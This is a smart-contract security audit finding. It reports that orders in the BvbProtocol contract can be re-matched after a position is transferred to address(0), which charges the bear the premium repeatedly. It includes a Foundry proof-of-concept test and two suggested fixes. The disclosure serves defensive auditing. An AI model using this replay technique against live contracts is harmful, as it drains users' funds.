## Details
# Orders can be matched multiple time costing multiple premiums

## Summary
Bulls can match orders made by bears multiple times, costing the bear the premium amount multiple times. This isnt profitable for the attacker, but can cause unforeseen losses to the bear's side.
## Vulnerability Detail
The only criterion for checking if an order is already matched is in the function `checkisValidOrder`
`require(bulls[uint(orderHash)] == address(0), "ORDER_ALREADY_MATCHED");`

This can be fooled by using the `transferPosition` function with `recipient = adress(0)` by the bull which which will set the new bull to `address(0)`. Then the bull can again match that order. This will cause the bull to lose the collateral each time which makes it unprofitable, but will also cost the bear the premium each time which still makes it an attack leading to loss of user funds.
## Impact
Bear will have premium deducted from it multiple times, draining their wallet.

Proof of concept of attack (Foundry):
```solidity
function testDoubleMatch() public {
        // Set order
        BvbProtocol.Order memory order = defaultOrder2();
        order.premium = 1 ether;
        order.collateral = 1 ether;
        bytes32 orderHash = bvb.hashOrder(order);
        bytes memory signature = signOrder(bearPrivateKey, order);
        bvb.matchOrder(order, signature);
        // Bear balance after 1st match
        uint256 intermediateBearBalance = weth.balanceOf(bear);
        // Transfer off
        bvb.transferPosition(orderHash, true, address(0));
        // Match again
        bvb.matchOrder(order, signature);
        // Bear balance after 2nd match
        uint256 secondMatchedBearBalance = weth.balanceOf(bear);
        // Bear paid twice!
        assert(secondMatchedBearBalance < intermediateBearBalance);
    }
```

## Tool used
Foundry

## Recommendation
Can be mitigated by two methods:
1. Check for both bear AND bull in the function `checkIsValidOrder` by adding another require
`require(bears[uint(orderHash)] == address(0), "ORDER_ALREADY_MATCHED");`

2. Since address(0) is being used for checking, make sure positions cannot be transferred to that address. If users want to burn thir side of the contract, they can send to 0xdead address, not address(0). In function `transferPosition`, add
`require(recipient != address(0), "Can't transfer to address 0");`
